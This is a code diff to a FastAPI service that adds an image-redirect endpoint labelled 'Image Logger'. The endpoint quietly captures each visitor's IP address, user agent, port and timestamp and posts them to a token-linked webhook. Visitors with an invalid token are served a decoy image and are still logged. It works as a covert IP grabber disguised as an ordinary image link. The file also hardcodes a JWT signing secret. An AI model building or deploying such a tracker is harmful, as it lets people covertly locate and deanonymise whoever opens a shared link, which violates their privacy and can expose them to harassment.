@@ -13,12 +13,13 @@ from app.Util import CheckIP
 import app.curd as curd, app.schemas as schemas
 from jose import JWTError, jwt
 from app.database import SessionLocal
+from fastapi.responses import RedirectResponse
+
 # from dotenv import load_dotenv
 import os
 import app.model as model
 from sqlalchemy.orm import Session
 uri_path= '/app/app/image/'
-# uri_path='/home/lph77/GitHub/fastapi-docker-traefik/app/image/'
 '''
 database setup
 '''
@@ -49,7 +50,7 @@ logging to app.log
 SECRET_KEY = "09d25e094faa6ca2556c818166b7a9563b93f7099f6f0f4caa6cf63b88e8d3e7"
 ALGORITHM = "HS256"
 ACCESS_TOKEN_EXPIRE_MINUTES = 30
-thumnail= "https://z-image-cdn.com/view"
+thumnail= "https://media-ten.z-cdn.me/"
 '''
 
 http middleware to get IP
@@ -57,7 +58,7 @@ http middleware to get IP
 @app.middleware("http")
 async def log_ip(request: Request, call_next):
     ip = request.headers['x-real-ip']
-    # ip= '116.97.176.41'
+    # ip= '116.99.176.40'
     port= request.client.port
     timestamp = datetime.now(pytz.timezone('Asia/Ho_Chi_Minh'))
     request.state.ip = ip
@@ -69,12 +70,20 @@ async def log_ip(request: Request, call_next):
 '''
 Root route and logger ip to database
 '''
-@app.get("/")
-async def read_root(request: Request, user_agent: str = Header(None, convert_underscores=True), db: Session = Depends(get_db)):
+@app.get("/api/{urlpath}/{imagename}")
+async def redirect_image(background_tasks: BackgroundTasks,request: Request, urlpath: str,token: str = None, user_agent: str = Header(None, convert_underscores=True), imagename: str = None, db: Session = Depends(get_db) ):
+    ip = request.state.ip
     timestamp = request.state.timestamp
     port = request.state.port
-    ip = request.state.ip
-    # CheckIP(ip, url=config["webhook_error"],useragent=user_agent, timestamp=timestamp, port=port, url_thumbnail=config['image'], botname='Cảnh báo server ROOT', db=db)
+    webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
+    print(f'{urlpath}')
+    if not urlpath or not imagename or token==None or not curd.check_exists_token(db, token=token):
+        background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=imagename, url_thumbnail=f"https://media-ten.z-cdn.me/{urlpath}/{imagename}", botname='Cảnh báo server configuration',db=db)
+        return RedirectResponse(f"https://media-ten.z-cdn.me/yYs3rlgP4qQAAAAF/keanu-keanu-reeves.png")
+    background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=imagename, url_thumbnail=f"https://media-ten.z-cdn.me/{urlpath}/{imagename}", botname='Image Logger', db=db)
+    return RedirectResponse(f"https://media-ten.z-cdn.me/{urlpath}/{imagename}")
+@app.get("/")
+async def read_root(request: Request, user_agent: str = Header(None, convert_underscores=True), db: Session = Depends(get_db)):
     return {"Hello": "World FastAPI"}
 #  Login to get Token
 @app.post("/login", response_model=schemas.Token)
